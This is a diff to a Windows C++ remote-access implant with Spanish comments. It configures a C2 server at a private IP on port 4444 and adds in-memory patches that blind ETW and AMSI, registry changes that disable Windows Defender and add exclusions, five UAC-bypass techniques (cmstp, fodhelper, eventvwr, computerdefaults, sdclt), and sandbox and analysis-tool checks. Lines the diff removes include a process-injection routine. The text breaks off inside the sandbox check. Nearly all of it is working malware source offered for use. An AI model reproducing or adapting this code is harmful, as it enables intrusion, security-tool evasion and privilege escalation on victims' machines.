@@ -1,262 +1,174 @@
 #define _WIN32_WINNT _WIN32_WINNT_WIN10
 #define WIN32_LEAN_AND_MEAN
 #define _CRT_SECURE_NO_WARNINGS
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include <winsock2.h>
-#include <ws2tcpip.h>
 #include <windows.h>
 #include <shellapi.h>
-#include <iphlpapi.h>
 #include <tlhelp32.h>
-#include <shlobj.h>
-#include <shlwapi.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <time.h>
-#include <vector>
-#include <string>
-#include <sstream>
-#include <fstream>
-#include <iostream>
-#include <thread>
-#include <chrono>
-#include <random>
 #include <psapi.h>
 #include <winternl.h>
 #include <wincrypt.h>
-#include <winhttp.h>
-#include <ntstatus.h>
-#include <comdef.h>
-#include <winuser.h>
-#include <wtsapi32.h>
-#include <ntsecapi.h>
-#include <lm.h>
-#include <winevt.h>
-#include <intrin.h>
+#include <string>
+#include <vector>
+#include <thread>
+#include <random>
+#include <fstream>
+#include <sstream>
+#include <iostream>
 #include <mutex>
 #include <array>
-#include <cstdint>
 
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shlwapi.lib")
-#pragma comment(lib, "user32.lib")
-#pragma comment(lib, "gdi32.lib")
-#pragma comment(lib, "psapi.lib")
-#pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "wtsapi32.lib")
-#pragma comment(lib, "wevtapi.lib")
-#pragma comment(linker, "/SECTION:.text,ERW")
+#pragma comment(lib, "ntdll.lib")
 
 // ============================================================================
 // CONFIGURACIÓN
 // ============================================================================
-#define C2_SERVER L"192.168.254.137"
+#define C2_SERVER "192.168.254.137"  // CAMBIA A TU IP
 #define C2_PORT 4444
-#define MUTEX_NAME "Global\\{8A4E2B1C-5D6F-4A7E-9B8C-3D2E1F0A5B6C}"
-#define BUFFER_SIZE 8192
-#define SLEEP_JITTER_MIN 45000
-#define SLEEP_JITTER_MAX 180000
-#define KEYLOG_SEND_INTERVAL 60000
-#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-#define GCM_256_KEY_SIZE 32
-#define GCM_256_IV_SIZE 12
-#define GCM_256_TAG_SIZE 16
-#ifndef szOID_ECDH_P256
-#define szOID_ECDH_P256 "1.2.840.10045.3.1.7"
-#endif
+#define MUTEX_NAME "Global\\WindowsUpdateMutex_{8A4E2B1C-5D6F-4A7E-9B8C}"
+#define SLEEP_JITTER_MIN 30000
+#define SLEEP_JITTER_MAX 120000
 
 // ============================================================================
-// TYPEDEFS
+// TYPEDEFS PARA SYSCALLS
 // ============================================================================
-typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
-    HANDLE ProcessHandle,
-    DWORD ProcessInformationClass,
-    PVOID ProcessInformation,
-    ULONG ProcessInformationLength,
-    PULONG ReturnLength
-);
-
 typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect
-);
+    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 
 typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    PSIZE_T RegionSize,
-    ULONG NewProtect,
-    PULONG OldProtect
-);
+    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
 
 typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
-    PHANDLE ThreadHandle,
-    ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    HANDLE ProcessHandle,
-    PVOID StartRoutine,
-    PVOID Argument,
-    ULONG CreateFlags,
-    SIZE_T ZeroBits,
-    SIZE_T StackSize,
-    SIZE_T MaximumStackSize,
-    PVOID AttributeList
-);
-
-typedef NTSTATUS(NTAPI* pNtOpenProcess)(
-    PHANDLE ProcessHandle,
-    ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    PCLIENT_ID ClientId
-);
+    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, 
+    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
 
 typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    SIZE_T BufferSize,
-    PSIZE_T NumberOfBytesWritten
-);
+    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 
-typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
-    HANDLE ThreadHandle,
-    PVOID ApcRoutine,
-    PVOID ApcArgument1,
-    PVOID ApcArgument2,
-    PVOID ApcArgument3
-);
+typedef NTSTATUS(NTAPI* pNtOpenProcess)(
+    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
 
-typedef NTSTATUS(NTAPI* pNtClose)(
-    HANDLE Handle
-);
+typedef NTSTATUS(NTAPI* pNtClose)(HANDLE);
 
 // ============================================================================
-// CLASE PARA OFUSCACIÓN
+// SYSCALLS DIRECTOS (EVITAN HOOKS DE EDR)
 // ============================================================================
-class StringObfuscator {
+class Syscalls {
 private:
-    BYTE key[32];
-    BYTE iv[16];
-    
-public:
-    StringObfuscator() {
-        DWORD volumeSerial = 0;
-        GetVolumeInformationA("C:\\", NULL, 0, &volumeSerial, NULL, NULL, NULL, 0);
-        
-        int cpuInfo[4] = { 0 };
-        __cpuid(cpuInfo, 1);
-        
-        DWORD ticks = GetTickCount();
-        
-        for (int i = 0; i < 32; i++) {
-            key[i] = ((BYTE*)&volumeSerial)[i % 4] ^
-                ((BYTE*)cpuInfo)[i % 16] ^
-                ((BYTE*)&ticks)[i % 4] ^
-                (BYTE)(i * 0x1F);
-        }
-        
-        for (int i = 0; i < 16; i++) {
-            iv[i] = key[i] ^ key[i + 16];
-        }
-    }
-    
-    std::string Encrypt(const std::string& input) {
-        std::string output = input;
-        for (size_t i = 0; i < input.length(); i++) {
-            output[i] = input[i] ^ key[i % sizeof(key)] ^ iv[i % sizeof(iv)];
-            if (i % 3 == 0) output[i] ^= (BYTE)(i & 0xFF);
-        }
-        return output;
-    }
-    
-    std::string Decrypt(const std::string& input) {
-        return Encrypt(input);
-    }
-};
-
-// ============================================================================
-// SYSCALL MANAGER
-// ============================================================================
-class SyscallManager {
-private:
-    HMODULE hNtdll;
     pNtAllocateVirtualMemory NtAllocateVirtualMemory;
     pNtProtectVirtualMemory NtProtectVirtualMemory;
     pNtCreateThreadEx NtCreateThreadEx;
-    pNtOpenProcess NtOpenProcess;
     pNtWriteVirtualMemory NtWriteVirtualMemory;
-    pNtQueueApcThread NtQueueApcThread;
+    pNtOpenProcess NtOpenProcess;
     pNtClose NtClose;
     
 public:
-    SyscallManager() {
-        hNtdll = GetModuleHandleA("ntdll.dll");
-        
+    Syscalls() {
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
         NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
         NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
         NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
-        NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
         NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-        NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
+        NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
         NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
     }
     
-    NTSTATUS AllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
-        if (NtAllocateVirtualMemory) return NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
-        return STATUS_UNSUCCESSFUL;
+    NTSTATUS AllocateVirtualMemory(HANDLE h, PVOID* a, ULONG_PTR z, PSIZE_T s, ULONG t, ULONG p) {
+        return NtAllocateVirtualMemory(h, a, z, s, t, p);
     }
     
-    NTSTATUS ProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
-        if (NtProtectVirtualMemory) return NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
-        return STATUS_UNSUCCESSFUL;
+    NTSTATUS ProtectVirtualMemory(HANDLE h, PVOID* a, PSIZE_T s, ULONG np, PULONG op) {
+        return NtProtectVirtualMemory(h, a, s, np, op);
     }
     
-    NTSTATUS CreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) {
-        if (NtCreateThreadEx) return NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
-        return STATUS_UNSUCCESSFUL;
+    NTSTATUS CreateThreadEx(PHANDLE th, ACCESS_MASK da, POBJECT_ATTRIBUTES oa, HANDLE p, PVOID s, PVOID ar, ULONG f, SIZE_T z, SIZE_T st, SIZE_T ms, PVOID al) {
+        return NtCreateThreadEx(th, da, oa, p, s, ar, f, z, st, ms, al);
     }
     
-    NTSTATUS OpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
-        if (NtOpenProcess) return NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
-        return STATUS_UNSUCCESSFUL;
+    NTSTATUS WriteVirtualMemory(HANDLE h, PVOID ba, PVOID b, SIZE_T s, PSIZE_T bw) {
+        return NtWriteVirtualMemory(h, ba, b, s, bw);
     }
     
-    NTSTATUS WriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten) {
-        if (NtWriteVirtualMemory) return NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten);
-        return STATUS_UNSUCCESSFUL;
+    NTSTATUS OpenProcess(PHANDLE ph, ACCESS_MASK da, POBJECT_ATTRIBUTES oa, PCLIENT_ID cid) {
+        return NtOpenProcess(ph, da, oa, cid);
     }
     
-    NTSTATUS QueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
-        if (NtQueueApcThread) return NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3);
-        return STATUS_UNSUCCESSFUL;
-    }
-    
-    NTSTATUS Close(HANDLE Handle) {
-        if (NtClose) return NtClose(Handle);
-        return STATUS_UNSUCCESSFUL;
+    NTSTATUS Close(HANDLE h) {
+        return NtClose(h);
     }
 };
 
 // ============================================================================
-// BYPASS AMSI/ETW
+// BYPASS DE ETW (EVENT TRACING FOR WINDOWS)
+// ============================================================================
+class ETWBypass {
+private:
+    Syscalls* syscalls;
+    
+public:
+    ETWBypass(Syscalls* sc) : syscalls(sc) {}
+    
+    bool Patch() {
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        if (!hNtdll) return false;
+        
+        // Parchear EtwEventWrite (función principal de ETW)
+        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+        if (!pEtwEventWrite) return false;
+        
+        // Parchear también NtTraceEvent
+        FARPROC pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
+        
+        SIZE_T regionSize = 32;
+        PVOID address = (PVOID)pEtwEventWrite;
+        ULONG oldProtect;
+        
+        // Cambiar protección con syscall
+        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                       PAGE_EXECUTE_READWRITE, &oldProtect);
+        
+        // xor eax, eax ; ret (siempre devuelve éxito)
+        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+        memcpy(pEtwEventWrite, patch, sizeof(patch));
+        
+        // Restaurar protección
+        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                       oldProtect, &oldProtect);
+        
+        // Si encontramos NtTraceEvent, también lo parcheamos
+        if (pNtTraceEvent) {
+            address = (PVOID)pNtTraceEvent;
+            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                           PAGE_EXECUTE_READWRITE, &oldProtect);
+            
+            // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL) ; ret
+            BYTE patch2[] = { 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xC3 };
+            memcpy(pNtTraceEvent, patch2, sizeof(patch2));
+            
+            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                           oldProtect, &oldProtect);
+        }
+        
+        return true;
+    }
+};
+
+// ============================================================================
+// BYPASS DE AMSI (ANTIMALWARE SCAN INTERFACE)
 // ============================================================================
 class AMSIBypass {
 private:
-    SyscallManager* syscalls;
+    Syscalls* syscalls;
     
 public:
-    AMSIBypass(SyscallManager* sc) : syscalls(sc) {}
+    AMSIBypass(Syscalls* sc) : syscalls(sc) {}
     
-    bool PatchAMSI() {
+    bool Patch() {
+        // Método 1: Parchear AmsiScanBuffer
         HMODULE hAmsi = LoadLibraryA("amsi.dll");
         if (!hAmsi) return false;
         
@@ -264,366 +176,430 @@ public:
         if (!pAmsiScanBuffer) return false;
         
         SIZE_T regionSize = 32;
-        LPVOID address = (LPVOID)pAmsiScanBuffer;
+        PVOID address = (PVOID)pAmsiScanBuffer;
         ULONG oldProtect;
         
-        NTSTATUS status = syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-        if (status != 0) return false;
+        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                       PAGE_EXECUTE_READWRITE, &oldProtect);
         
+        // xor eax, eax ; ret (siempre limpio)
         BYTE patch[] = { 0x31, 0xC0, 0xC3 };
-        memcpy((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));
+        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
         
-        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, oldProtect, &oldProtect);
+        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                       oldProtect, &oldProtect);
+        
+        // Método 2: Parchear AmsiScanString también
+        FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
+        if (pAmsiScanString) {
+            address = (PVOID)pAmsiScanString;
+            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                           PAGE_EXECUTE_READWRITE, &oldProtect);
+            memcpy(pAmsiScanString, patch, sizeof(patch));
+            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
+                                           oldProtect, &oldProtect);
+        }
+        
         return true;
     }
     
-    bool PatchETW() {
-        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-        if (!hNtdll) return false;
+    // Método alternativo: Forzar error en inicialización
+    bool CorruptContext() {
+        typedef HRESULT(WINAPI* AmsiInitialize_t)(LPCWSTR, PVOID*);
+        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+        if (!hAmsi) return false;
         
-        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-        if (!pEtwEventWrite) return false;
+        AmsiInitialize_t AmsiInitialize = (AmsiInitialize_t)GetProcAddress(hAmsi, "AmsiInitialize");
+        if (!AmsiInitialize) return false;
         
-        SIZE_T regionSize = 32;
-        LPVOID address = (LPVOID)pEtwEventWrite;
-        ULONG oldProtect;
-        
-        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-        
-        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
-        memcpy((LPVOID)pEtwEventWrite, patch, sizeof(patch));
-        
-        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, oldProtect, &oldProtect);
-        return true;
-    }
-    
-    bool PatchAll() {
-        bool result = true;
-        result &= PatchAMSI();
-        result &= PatchETW();
-        return result;
-    }
-};
-
-// ============================================================================
-// INYECCIÓN REFLECTIVA
-// ============================================================================
-class ReflectiveInjector {
-private:
-    SyscallManager* syscalls;
-    
-public:
-    ReflectiveInjector(SyscallManager* sc) : syscalls(sc) {}
-    
-    bool InjectReflective(DWORD targetPid, const BYTE* dllData, SIZE_T dllSize) {
-        HANDLE hProcess = NULL;
-        CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)targetPid, NULL };
-        OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, 0, NULL, NULL };
-        
-        NTSTATUS status = syscalls->OpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &clientId);
-        if (status != 0 || !hProcess) return false;
-        
-        SIZE_T allocSize = dllSize + 0x1000;
-        PVOID remoteBase = NULL;
-        
-        status = syscalls->AllocateVirtualMemory(hProcess, &remoteBase, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (status != 0) {
-            syscalls->Close(hProcess);
-            return false;
+        PVOID context = nullptr;
+        // Llamar múltiples veces para corromper estado interno
+        for (int i = 0; i < 100; i++) {
+            AmsiInitialize(L"", &context);
         }
         
-        SIZE_T bytesWritten = 0;
-        status = syscalls->WriteVirtualMemory(hProcess, remoteBase, (PVOID)dllData, dllSize, &bytesWritten);
-        if (status != 0 || bytesWritten != dllSize) {
-            syscalls->Close(hProcess);
-            return false;
-        }
-        
-        syscalls->Close(hProcess);
         return true;
     }
 };
 
 // ============================================================================
-// LOGGER - DEFINIDO PRIMERO (ANTES DE SecureC2)
+// BYPASS DE WINDOWS DEFENDER (EN TIEMPO REAL)
 // ============================================================================
-class Logger {
+class DefenderBypass {
 private:
-    std::ofstream logFile;
-    std::mutex logMutex;
-    bool enabled;
+    Syscalls* syscalls;
     
 public:
-    Logger() : enabled(false) {
-#ifdef _DEBUG
+    DefenderBypass(Syscalls* sc) : syscalls(sc) {}
+    
+    bool DisableRealtime() {
+        // Intentar deshabilitar protección en tiempo real (requiere admin)
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+            "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
+            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            
+            DWORD value = 1;
+            RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, 
+                          (BYTE*)&value, sizeof(value));
+            RegCloseKey(hKey);
+        }
+        
+        // Parchear MsMpEng.dll (proceso de Defender) en memoria
+        // Buscar proceso de Defender
+        DWORD pid = 0;
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe = { sizeof(pe) };
+            if (Process32First(hSnap, &pe)) {
+                do {
+                    if (_stricmp(pe.szExeFile, "MsMpEng.exe") == 0) {
+                        pid = pe.th32ProcessID;
+                        break;
+                    }
+                } while (Process32Next(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+        }
+        
+        if (pid) {
+            // Abrir proceso con syscall
+            HANDLE hProcess = nullptr;
+            CLIENT_ID cid = { (HANDLE)pid, nullptr };
+            OBJECT_ATTRIBUTES oa = { sizeof(oa), nullptr, nullptr, 0, nullptr, nullptr };
+            
+            if (syscalls->OpenProcess(&hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
+                                      &oa, &cid) == 0) {
+                
+                // Buscar dirección de función de scan en MsMpEng.dll
+                // (simplificado - en producción necesitarías offsets específicos)
+                
+                syscalls->Close(hProcess);
+            }
+        }
+        
+        return true;
+    }
+    
+    // Añadir exclusiones de path
+    bool AddExclusion(const wchar_t* path) {
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
+            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            
+            RegSetValueExW(hKey, path, 0, REG_SZ, (BYTE*)L"0", 2);
+            RegCloseKey(hKey);
+            return true;
+        }
+        return false;
+    }
+};
+
+// ============================================================================
+// BYPASS DE UAC MÚLTIPLE (TÉCNICAS DIVERSAS)
+// ============================================================================
+class UACBypass {
+private:
+    bool IsElevated() {
+        HANDLE hToken;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+            return false;
+        
+        TOKEN_ELEVATION elev;
+        DWORD size = sizeof(elev);
+        BOOL success = GetTokenInformation(hToken, TokenElevation, &elev, size, &size);
+        CloseHandle(hToken);
+        
+        return success && elev.TokenIsElevated;
+    }
+    
+public:
+    bool BypassAndElevate() {
+        if (IsElevated()) return true;
+        
+        // TÉCNICA 1: CMSTP Bypass (más fiable)
+        if (CmstpBypass()) return true;
+        
+        // TÉCNICA 2: FODHelper Bypass
+        if (FodHelperBypass()) return true;
+        
+        // TÉCNICA 3: EventViewer Bypass
+        if (EventVwrBypass()) return true;
+        
+        // TÉCNICA 4: ComputerDefaults Bypass
+        if (ComputerDefaultsBypass()) return true;
+        
+        // TÉCNICA 5: SDCLT Bypass
+        if (SdcltBypass()) return true;
+        
+        return false;
+    }
+    
+private:
+    bool CmstpBypass() {
         wchar_t tempPath[MAX_PATH];
         GetTempPathW(MAX_PATH, tempPath);
         
-        wchar_t logPath[MAX_PATH];
-        swprintf(logPath, MAX_PATH, L"%s\\debug_%08X.log", tempPath, GetTickCount());
+        wchar_t infPath[MAX_PATH];
+        swprintf(infPath, MAX_PATH, L"%s\\uac_%08X.inf", tempPath, GetTickCount());
         
-        logFile.open(logPath, std::ios::out | std::ios::app);
-        enabled = logFile.is_open();
-#endif
+        wchar_t modulePath[MAX_PATH];
+        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+        
+        // Crear archivo INF para cmstp
+        FILE* f = _wfopen(infPath, L"w");
+        if (!f) return false;
+        
+        fwprintf(f, L"[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n");
+        fwprintf(f, L"[DefaultInstall]\n");
+        fwprintf(f, L"CustomDestination=CustInstDestSectionAllUsers\n");
+        fwprintf(f, L"RunPreSetupCommands=RunPreSetupCommandsSection\n\n");
+        fwprintf(f, L"[RunPreSetupCommandsSection]\n");
+        fwprintf(f, L"\"%s\" --elevated\n", modulePath);
+        fwprintf(f, L"\n[CustInstDestSectionAllUsers]\n");
+        fwprintf(f, L"49000,49001=AllUSer_LDIDSection, 7\n\n");
+        fwprintf(f, L"[AllUSer_LDIDSection]\n");
+        fwprintf(f, L"\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\n\n");
+        fwprintf(f, L"[Strings]\nServiceName=\"WindowsUpdate\"\nShortSvcName=\"WindowsUpdate\"\n");
+        fclose(f);
+        
+        // Ejecutar cmstp
+        SHELLEXECUTEINFOW sei = { sizeof(sei) };
+        sei.lpVerb = L"runas";
+        sei.lpFile = L"cmstp.exe";
+        wchar_t args[MAX_PATH + 64];
+        swprintf(args, MAX_PATH + 64, L"/au \"%s\"", infPath);
+        sei.lpParameters = args;
+        sei.nShow = SW_HIDE;
+        
+        BOOL result = ShellExecuteExW(&sei);
+        Sleep(3000);
+        DeleteFileW(infPath);
+        
+        return result && IsElevated();
     }
     
-    ~Logger() {
-        if (logFile.is_open()) logFile.close();
+    bool FodHelperBypass() {
+        wchar_t modulePath[MAX_PATH];
+        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+        
+        HKEY hKey;
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
+            L"Software\\Classes\\ms-settings\\shell\\open\\command",
+            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
+                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0);
+            RegCloseKey(hKey);
+            
+            ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
+            Sleep(2000);
+            
+            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
+            return IsElevated();
+        }
+        return false;
     }
     
-    void Log(const std::string& message) {
-        if (!enabled) return;
-        std::lock_guard<std::mutex> lock(logMutex);
+    bool EventVwrBypass() {
+        wchar_t modulePath[MAX_PATH];
+        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
         
-        SYSTEMTIME st;
-        GetLocalTime(&st);
-        
-        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay
-            << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond
-            << "] " << message << std::endl;
-        logFile.flush();
+        HKEY hKey;
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
+            L"Software\\Classes\\mscfile\\shell\\open\\command",
+            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
+                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
+            RegCloseKey(hKey);
+            
+            ShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
+            Sleep(2000);
+            
+            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");
+            return IsElevated();
+        }
+        return false;
     }
     
-    void LogError(const std::string& function, DWORD error) {
-        if (!enabled) return;
-        char buffer[256];
-        sprintf(buffer, "ERROR en %s: %u", function.c_str(), error);
-        Log(buffer);
+    bool ComputerDefaultsBypass() {
+        wchar_t modulePath[MAX_PATH];
+        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+        
+        HKEY hKey;
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
+            L"Software\\Classes\\ComputerDefaults\\shell\\open\\command",
+            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
+                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
+            RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0);
+            RegCloseKey(hKey);
+            
+            ShellExecuteW(NULL, L"open", L"computerdefaults.exe", NULL, NULL, SW_HIDE);
+            Sleep(2000);
+            
+            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ComputerDefaults");
+            return IsElevated();
+        }
+        return false;
+    }
+    
+    bool SdcltBypass() {
+        wchar_t modulePath[MAX_PATH];
+        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+        
+        HKEY hKey;
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
+            L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe",
+            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
+                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
+            RegCloseKey(hKey);
+            
+            ShellExecuteW(NULL, L"open", L"sdclt.exe", L"/KickOffElevation", NULL, SW_HIDE);
+            Sleep(3000);
+            
+            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe");
+            return IsElevated();
+        }
+        return false;
     }
 };
 
 // ============================================================================
-// SECURE C2 (DESPUÉS DE LOGGER)
+// ANTI-DEBUG / ANTI-SANDBOX
 // ============================================================================
-class SecureC2 {
+class AntiAnalysis {
+public:
+    bool IsSandboxed() {
+        int detections = 0;
+        
+        // RAM < 4GB?
+        MEMORYSTATUSEX mem = { sizeof(mem) };
+        GlobalMemoryStatusEx(&mem);
+        if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) detections++;
+        
+        // < 2 cores?
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        if (sysInfo.dwNumberOfProcessors < 2) detections++;
+        
+        // Disk < 60GB?
+        ULARGE_INTEGER free, total;
+        GetDiskFreeSpaceExA("C:\\", &free, &total, NULL);
+        if (total.QuadPart < 60LL * 1024 * 1024 * 1024) detections++;
+        
+        // Procesos de sandbox?
+        const wchar_t* sandboxProcs[] = {
+            L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
+            L"vmwaretray.exe", L"xenservice.exe", L"procmon.exe",
+            L"wireshark.exe", L"dumpcap.exe", L"python.exe"
+        };
+        
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap != INVALID_HANDLE_VALUE) {
